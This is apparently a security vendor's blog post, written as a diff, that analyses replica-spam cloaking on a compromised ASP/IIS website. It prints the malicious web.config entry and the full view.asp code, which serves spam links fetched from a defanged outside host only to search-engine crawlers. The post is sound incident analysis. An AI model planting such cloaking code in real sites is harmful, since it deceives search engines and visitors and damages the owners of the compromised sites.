@@ -1,0 +1,80 @@
+Replica Spam on Poorly Maintained ASP Site
+
+Although the majority of sites we work on are powered by PHP, we still have clients whose sites use other programming languages.
+The other day we cleaned an ASP site where we found a web.config file (the ASP.NET version of .htaccess) with these instructions:
+<configuration>
+
+<system.webServer>
+
+<defaultDocument enabled="true">
+
+<files>
+
+<clear />
+
+<add value="view.asp" />
+
+<add value="Default.asp" />
+
+<add value="index.htm" />
+
+<add value="index.html" />
+
+<add value="iisstart.htm" />
+
+<add value="default.aspx" />
+
+<add value="index.asp" />
+
+<add value="index.aspx" />
+
+</files>
+
+</defaultDocument>
+
+...
+It added 8 different filenames as “default document”. These are the files that the IIS web server tries to load when it receives a request to the root directory. Seven of these filenames are more or less typical to IIS; however view.asp is not a common name — and since it is specified at the top of the list, IIS will start a search for a default document with this specific name in the current directory.
+Cloaking
+In our case, view.asp contained this code:
+<!--#include file="Default.asp"-->
+
+<%
+
+Set http = Server.CreateObject ("Microsoft.XMLHTTP")
+
+set regexn = new regexp
+
+regexn.ignorecase = true
+
+regexn.global = true
+
+regexn.pattern = "Google Web Preview|google|yahoo|msnbot"
+
+if regexn.test(request.ServerVariables("HTTP_USER_AGENT")) then
+
+http.Open "GET", "hxxp://jackshopservice[.]com/google.js.php", false
+
+http.Send
+
+Response.write http.ResponseText
+
+end if
+
+Set http = Nothing
+
+Set regexn = Nothing
+
+%>
+
+The first line of code includes the real default file Default.asp. This ensures that the legitimate content is being loaded regardless of what the following code does.
+The rest of the code checks if a request comes from a search engine crawler and appends the contents of the third-party hxxp://jackshopservice[.]com/google.js.php page to the legitimate response.
+At this moment, google.js.php contains a long list of replica spam links for various well-known fashion labels:
+Spammy links returned by google.js.php
+While these links seem to be pointing to unrelated compromised sites, most of them are behind the CloudFlare firewall. There is also a noticeable dominance of European top-level domains (TLDs) such as .nl, .de, .fr, ,dk, and .uk. This suggests that this could be a result of a server-level compromise — or a compromise of some agency that manages all of those sites.
+Backlink Profiles
+When we began checking the backlink profiles of the sites found in the spammy links, we noticed that they all had a commonality. Around 100 of the same sites linking to them used spammy keywords.
+“Anchor Text” report by Majestic.com
+All of the sites that linked to them were powered by IIS servers (version 7.5 and 8.5), with about 90% of them hosted on the server with the IP 65.60.62.194. This also suggests a server-wide infection.
+Security Issues of Old Sites
+Along with the ASP platform, the majority of the compromised sites look as if they had been designed over a decade ago and not much has changed since then. Most likely their owners don’t put much effort into their maintenance, let alone securing them.
+If you are stuck with a legacy site on a less popular platform, we still can help you. Our cleanup and monitoring service works regardless of the software you use and our website firewall can virtually patch old websites that are no longer supported by their original developers.
